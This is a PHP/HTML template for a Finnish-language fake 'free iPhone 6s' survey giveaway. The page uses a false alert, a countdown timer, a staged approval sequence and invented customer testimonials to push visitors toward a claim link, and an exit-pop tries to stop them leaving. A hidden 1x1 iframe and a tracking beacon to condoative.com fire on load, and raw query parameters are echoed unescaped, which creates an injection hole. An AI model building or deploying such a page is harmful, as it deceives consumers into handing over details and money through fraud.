<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content=" maximum-scale=1.0">
		<title>Reward Center</title>
		<link href="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/ios.css" rel="stylesheet" type="text/css">
		<script>
			var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
			var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
			var now = new Date();
			var today = monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();
			function get_date(days) {
				return today = monthNames[now.getMonth()] + " " + (now.getDate() - days) + ", " + now.getFullYear();
			}
		</script>
	</head>
	<body>
		<div class="header">
			<p>
				<span>iPhone</span>&nbsp;&nbsp;&nbsp;Watch&nbsp;&nbsp;&nbsp;iPad&nbsp;&nbsp;&nbsp;Mac
			</p>
		</div>
		<div class="content">
			<p class="dt">
				<script type="text/javascript">
					document.write(today);
				</script>
			</p>
			<div class="main-content flag" style="    background: url(<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/flag-fi.png) #fff no-repeat 98% 20px;" id="content1">
				<h1>TESTAA & PIDÄ</h1>
				<h2>Sinut on sattumanvaraisesti valittu testaamaan uusi iPhone 6s! Testaamisen jaälkeen SAAT PITÄÄ SEN IKUISESTI!!</h2>
				<p>
					Tämä ei ole vitsi! Sinut on kutsuttu osallistumaan meidän iPhone6s testaukseen. Etsimme <strong style="color: #084BBF;">(3) lisä arvostelijaa jotta</strong> voimme tehdä iPhone 7:sta parhaan iPhonen ikinä.
					
				</p>
				<p>

					Jos haluat olla osana tätä yksityistä testi ryhtmää, vastaa seuraaviin 4 kysymykseen antaakseen meile arvokasta palautetta. 
					Kiitokseksi saat pitää UUDEN iPhone 6s 16GB puhelimen ilmaiseksi testin jälkeen! Sinulla on
					<font color="red"><b><span id="mins">2</span> minuuttia ja <span id="hsecs">30</span> sekuntia</b></font> aikaa vastata, muuten valitsemme toisen kandidaatin!
				</p>

				<div id="q1">
					<p class="question">
						<strong> Kysymys 1 / 4:</strong> Oletko ennen testannut Apple tuotella?
					</p>
					<div class="button bq1">
						Kyllä
					</div>
					<div class="button bq1">
						Ei
					</div>
				</div>
				<div id="q2">
					<p class="question">
						<strong> Kysymys 2 / 4:</strong> Mikä näistä ominaisuuksista tulisi olla iPhone 7:ssa?
					</p>
					<div class="button bq2">
						Langaton lataus
					</div>
					<div class="button bq2">
						QHD Näyttö Resoluutio
					</div>
				</div>
				<div id="q3">
					<p class="question">
						<strong> Kysymys 3 / 4:</strong> Mitä viestimuotoa käytät eniten?
					</p>
					<div class="button bq3">
						Normaali Tekstiviesti
					</div>
					<div class="button bq3">
						Multimedia Viesti
					</div>
				</div>
				<div id="q4">
					<p class="question">
						<strong> Kysymys 4 / 4:</strong> Onko sinulla hyväksyttävä toimitus osoite, jotta voit saada sinun iPhone 6s puhelimen?
					</p>
					<div class="button bq4">
						Kyllä
					</div>
					<div class="button bq4">
						Ei
					</div>
				</div>
			</div>
			<div class="main-content" id="content2">
				<h1 style="text-align:center;">Tarkistamme vastauksiasi.</h1>
				<p class="loading"><img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/loading.gif">
				</p>
				<p class="result" id="result1">
					Ei löytyneiitä tupla rekisteröitymisiä.
				</p>
				<p class="result" id="result2">
					(3) paikkaa vielä jäljellä
				</p>
				<p class="result" id="result3">
					Sinut on hyväksytty (1) iPhone 6s + Apple T-Paita vastaanottajaksi
				</p>
			</div>
			<div class="main-content" id="content3">
				<h1 style="text-align:center;">Onneksi olkoon! Sinut on hyväksytty testiryhmään!</h1>
				<h2>Klikkaa alla olevaa painiketta ja rekisteröidy sinun ilmaiselle iPhone 6s puhelimelle kiitokseksi kyselyyn vastaamisesta.</h2>
				<h2 style="text-align:center;"><strong>LUNASTA PAIKKASI SAADAKSESI LAHJA</strong></h2>
				<p class="loading">
						<?php
					$ulbid = NULL;
					$email= NULL;
					$iframe= NULL;
					if(isset($_GET["ulbid"])){
						
						if (strpos($options[0]['button_url'], '?') !== FALSE){
							$ulbid = '&ulbid='.$_GET["ulbid"];
						}else{
							$ulbid = '?ulbid='.$_GET["ulbid"];
						}
						$iframe = $options[0]['iframe_url'].$ulbid;
						if(isset($_GET["email"])){
							if (strpos($options[0]['button_url'], '?') !== FALSE){
								$email= '&email='.$_GET['email'];
							}else{
								$email= '?email='.$_GET['email'];
							}
						}
					}
					if (strpos($options[0]['button_url'], '?') !== FALSE){
									$buttonURL = $options[0]['button_url'].'&'.$_SERVER["QUERY_STRING"];
								}else{
									$buttonURL = $options[0]['button_url'].'?'.$_SERVER["QUERY_STRING"];
								}
						
						//}
					?>
					
					<a onclick="PreventExitPop = false;" href="<?php echo $buttonURL?>"><img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/iphone6.png"></a>
				</p>
				<a href="<?php echo $buttonURL?>" onclick="PreventExitPop = false;" class="claim">
				<div class="button2">
					Lunasta Nyt
				</div></a>
				<p style="text-align:center;">
					Syötä oikea toimitus osoite seuraavalla sivulla saadaksesi ilmaisen iPhone 6s puhelimen. Rajoitettu määrä, toimi nopeasti!
				</p>
			</div>
			<div class="main-content">
				<hr>
				<p style="color:#a8a7a7;">
					<span style="color:#a8a7a7;cursor:pointer;"onclick="total_likes();return false" id="liked">Tykkää</span> &bull; Kommentti &bull; Laskin
				</p>
				<hr>
				<div class="comments">
					<p style="margin:0;padding:0;" id="total_likes">
						<span style="color:#3b5998;">12,068</span> like this
					</p>
				</div>
				<div class="comments">
					<p style="margin:0;padding:0;float:left;display:block;width:50%;">
						<span style="color:#3b5998;">Katso lisää kommentteja</span>
					</p>
					<p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right;">
						50 of 80,312
					</p>
					<div style="clear:both;"></div>
				</div>

				<div class="comments">
					<div class="profile">
						<img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/7.jpg">
					</div>
					<div class="comment-content">
						<p class="name">
							Anne Koski
						</p>
						<p>
							Sain omani tänään. Kiitos tosi paljon!! T-paitani on liian iso, voinko vaihtaa sen jollain tavalla? :)
							<br>
							<img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/item1.png">
						</p>
					</div>
					<div class="clr"></div>
					<div class="comment-status">
						<span>Tykkää · Reply · <img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/like.png" width="15px" height="15px"></img>87</span> ·
						<script type="text/javascript">
							document.write(get_date(0));
						</script>
					</div>
				</div>
				<div class="comments">
					<div class="profile">
						<img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/8.jpg">
					</div>
					<div class="comment-content">
						<p class="name">
							Petri Aaltonen
						</p>
						<p>
							En ollut varma onko tämä ihan totta, mutta sain puhleimeni tänään!
						</p>
					</div>
					<div class="clr"></div>
					<div class="comment-status">
						<span>Tykkää · Reply · <img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/like.png" width="15px" height="15px"></img>54</span> ·
						<script type="text/javascript">
							document.write(get_date(0));
						</script>
					</div>
				</div>
				<div class="comments">
					<div class="profile">
						<img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/9.jpg">
					</div>
					<div class="comment-content">
						<p class="name">
							Petra Bazar 
						</p>
						<p>
							Luulin että tämä huijaus, mutta iPhone ja jätti paita tuli postilaatikko eilen. Lisää tämän laisia! :D
							<br>
							<img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/item2.png">
						</p>
					</div>
					<div class="clr"></div>
					<div class="comment-status">
						<span>Tykkää · Reply · <img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/like.png" width="15px" height="15px"></img>10</span> ·
						<script type="text/javascript">
							document.write(get_date(0));
						</script>
					</div>
				</div>
				<div class="comments">
					<div class="profile">
						<img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/10.jpg">
					</div>
					<div class="comment-content">
						<p class="name">
							Aleksi Koivurinta
						</p>
						<p>
							SAIRASTA! iPhone ihan ilmaiseksi, mitä vi**ua?? Koitin saada myös ton iPadin: mut valitti että olen jo rekisteröitynyt. Yrittänyttä ei laiteta.. :D
						</p>
					</div>
					<div class="clr"></div>
					<div class="comment-status">
						<span>Tykkää · Reply · <img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/like.png" width="15px" height="15px"></img>45</span> ·
						<script type="text/javascript">
							document.write(get_date(1));
						</script>
					</div>
				</div>
				<div class="comments">
					<div class="profile">
						<img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/11.jpg">
					</div>
					<div class="comment-content">
						<p class="name">
							Paul Rogger
						</p>
						<p>
							I have seen before , but ignored it because I thought it waste of time . Now I have even seen and taken part in the advertising . Just obtained an iPhone 6s. COOL!
						</p>
					</div>
					<div class="clr"></div>
					<div class="comment-status">
						<span>Tykkää · Reply · <img src="<?php echo base_url('assets/'.$options[0]['view'])?>/assets/images/like.png" width="15px" height="15px"></img>3</span> -
						<script type="text/javascript">
							document.write(get_date(2));
						</script>
					</div>
				</div>
			</div>
		</div>
<p style="text-align: center" class="small text-right"> <small><a style="color:black;text-decoration:none" target="_blank" href="http://ozvisions.com/iphone6s_grey_01/fi/terms.php">Terms & Conditions</a></small></p>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

		<script type="text/javascript">
			$(document).ready(function() {
				setTimeout(function() {
					$("#comment1").fadeIn();
				}, 10000);
				setTimeout(function() {
					$("#comment2").fadeIn();
				}, 12000);
				setTimeout(function() {
					$("#comment3").fadeIn();
				}, 13000);
				setTimeout(function() {
					$("#comment4").fadeIn();
				}, 18000);
				setTimeout(function() {
					$("#comment5").fadeIn();
				}, 20000);
				setTimeout(function() {
					$("#comment6").fadeIn();
				}, 22000);
				$(".bq1").click(function() {
					$("#q1").fadeOut(0);
					$("#q2").fadeIn(500);
				});
				$(".bq2").click(function() {
					$("#q2").fadeOut(0);
					$("#q3").fadeIn(500);
				});
				$(".bq3").click(function() {
					$("#q3").fadeOut(0);
					$("#q4").fadeIn(500);
				});
				$(".bq4").click(function() {
					$("#content1").fadeOut(0);
					$("#content2").fadeIn();
					setTimeout(function() {
						$("#result1").fadeIn(1000);
					}, 3000);
					setTimeout(function() {
						$("#result2").fadeIn(1000);
					}, 4500);
					setTimeout(function() {
						$("#result3").fadeIn(1000);
					}, 6000);
					setTimeout(function() {
						$("#content2").fadeOut();
					}, 7500);
					setTimeout(function() {
						$("#content3").fadeIn();
					}, 7500);
				});
			});

			function getURLParameter(name) {
				name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
				var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"), results = regex.exec(location.search);
				return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
			}



			alert("ONNITTELUT Käyttäjä !\n\nSinun laite valittiin koska tarvitsemme lisää testaajia uudelle iPhone6s puhelimelle odottaessa tulevaa iPhone 7 mallia.\n\nPaina OK osallistuaksesi ja voit pitää UUDEN iPhone 6s puhelimen testin jälkeen");

			setInterval('countdown()', 1000);
			function countdown() {
				var mins = parseInt(document.getElementById("mins").innerHTML);
				var secs = parseInt(document.getElementById("hsecs").innerHTML);
				nsecs= 0;
				if (mins != 0 && secs == 0) {
					nmins = mins - 1;
					nsecs = 59;
				} else if (mins != 0 || secs != 0) {
					nmins = mins;
					nsecs = secs - 1;
				} else if (mins == 0 && secs == 0) {
					nmins = mins;
					nsecs = secs;
				}
				document.getElementById("mins").innerHTML = nmins;
				document.getElementById("hsecs").innerHTML = nsecs;
				if (nsecs < 10)
					nsecs = "0" + nsecs;
				document.getElementById("secs").innerHTML = nsecs;
			}
			 var PreventExitPop = true;
			  function ExitPop() {
			    if(PreventExitPop != false) {
			      return "Are you sure you want to leave this page?\n\nWe have randomly selected you to stand a great chance to be our iPhone 6s winner. If you leave the page , we will give the chance to someone else\n\n---"
			    }
			  }
			  window.onbeforeunload = ExitPop;
		</script>
<iframe width="1" height="1" style="position:absolute;left:0;bottom:0" src="<?php echo $iframe;?>"></iframe>
	<script type="text/javascript">
	(new Image()).src='<?php echo '//condoative.com/analytics/setWcookie?route='.$_GET['route'].'&ulbid='.$_GET['ulbid']?>';
</script>
	</body>
</html>